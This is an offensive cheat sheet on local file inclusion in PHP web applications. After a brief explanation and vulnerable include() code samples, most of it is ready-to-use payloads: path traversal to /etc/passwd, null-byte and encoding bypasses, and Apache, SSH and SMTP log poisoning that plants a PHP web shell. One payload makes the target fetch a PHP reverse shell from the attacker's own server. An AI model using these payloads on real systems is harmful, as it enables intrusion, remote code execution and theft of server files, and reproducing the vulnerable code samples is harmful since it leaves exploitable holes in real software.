# Local File Inclusion/lfi
## @Author : M3tr1c_r00t
<li>
  <ul>An lfi is a web vulnerability which allows one to be able to view the servers files or even include other files within the root folder of the web server.
  </ul>
  <ul>An lfi can lead to information disclosure, cross-site scripting(XSS) and even rce(remote code execution).
  </ul>
  <ul>
  An lfi can occur when a server has been poorly configured or no proper sanitization practices are being observed.
  </ul>
  <ul>
  Lfi's usually occur when an application uses a path to a file as input.
  </ul>
  <ul>
  The server treats the input as trusted and is then executed.
  </ul>
  <ul>
  Other lfi's gives attackers the abilities to upload files into the server.
  </ul>
</li>

For example;
```
https://example-site.com/?module=contact.php
```
As an attacker, we can change the module part, as it being used as a path to the contact.php and try to view the internal files...

```
https://example-site.com/?module=/etc/passwd
```
### LFI Attacks

#### We can test for lfi vulnerable code by using "../" a couple of times
```
https://example-site.com/?module=../../../../etc/passwd
```
The code example for this can be
```
<?php
$file = $_GET['file'];

 include('directory/' . $file)

?>  

#or

<?php
   $file = $_GET['file'];
   if(isset($file))
   {
       include("$file");
   }
   else
   {
       include("index.php");
   }
   ?>
```
##### This vuln can be fixed with the below code tho its still vulnerable...

```
<?php

if(isset($_GET['file']))
{
        $file=str_replace('../','',$_GET['file']);
        $file=str_replace('./','',$file);
        echo @file_get_contents('./'.$file);
}

?>
    
```

#### bypass of: $_GET['param']."php"
In some servers, they add a definite file extension to prevent exploitation....
<br>
We can exploit this by adding a null byte in url encoding:
<br>
This only applies to php version 5.3.4 and below...
```
http://example.com/index.php?page=../../../etc/passwd%00 // Only applies to PHP 5.3.4 and below
```
<br>

#### In other cases, we can use url encoding...
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
```
#### If that doesn't work, try double url encoding...
```
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```


### Exploiting the LFI...
After you've already gotten your lfi, some keep files you can look out for include:

```
/var/log/apache2/access.log // if the server is apache
/var/log/auth.log //for ssh log poisoning
/var/log/mail.log //for smtp log poisonig

```
#### for Apache log poisoning...
```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log 

 

Payload: curl "http://192.168.8.108/" -H "User-Agent: <?php system(\$_GET['c']); ?>" 



Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log&c=id

OR

python -m SimpleHTTPServer 9000 



Payload: curl "http://<remote_ip>/" -H "User-Agent: <?php file_put_contents('shell.php',file_get_contents('http://<local_ip>:9000/shell-php-rev.php')) ?>" 


file_put_contents('shell.php')                                // What it will be saved locally on the target
file_get_contents('http://<local_ip>:9000/shell-php-rev.php') // Where is the shell on YOUR pc and WHAT is it called

Execute PHP Reverse Shell: http//10.10.10.10/shell.php
```

#### SSh log poisoning
```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log 



Payload: ssh <?php system($_GET['c']);?>@<target_ip>


Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log&c=id
```
#### SMTP log poisoning
```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/mail.log 



telnet <target_ip> 25 // Replace with the target IP
MAIL FROM:<toor@gmail.com>
RCPT TO:<?php system($_GET['c']); ?>

Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/mail.log&c=id
```


